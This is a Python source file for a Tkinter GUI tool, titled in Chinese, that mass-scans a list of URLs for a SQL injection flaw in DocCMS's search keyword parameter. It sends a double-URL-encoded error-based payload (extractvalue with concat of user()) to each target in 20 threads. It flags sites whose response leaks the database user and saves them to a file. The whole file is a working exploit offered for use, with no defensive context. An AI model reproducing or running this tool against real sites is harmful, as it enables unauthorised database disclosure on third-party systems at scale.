import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def doccms_keyword_sql_exp(url):
    poc = r"""/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "@localhost" in res.text:
            doccms_keyword_sql_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            doccms_keyword_sql_text.see(END)
            with open ("存在DocCMS keyword SQL注入漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            doccms_keyword_sql_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            doccms_keyword_sql_text.see(END)
    except Exception as err:
        doccms_keyword_sql_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        doccms_keyword_sql_text.see(END)
def get_doccms_keyword_sql_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def doccms_keyword_sql_gui():
    doccms_keyword_sql = tk.Tk()
    doccms_keyword_sql.geometry("910x450")
    doccms_keyword_sql.title("DocCMS keyword SQL注入漏洞一把梭")
    doccms_keyword_sql.resizable(0, 0)
    doccms_keyword_sql.iconbitmap('logo.ico')
    global doccms_keyword_sql_text
    doccms_keyword_sql_text = scrolledtext.ScrolledText(doccms_keyword_sql,width=123, height=25)
    doccms_keyword_sql_text.grid(row=0, column=0, padx=10, pady=10)
    doccms_keyword_sql_text.see(END)
    addrs = get_doccms_keyword_sql_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(doccms_keyword_sql_exp, addr)
    doccms_keyword_sql.mainloop()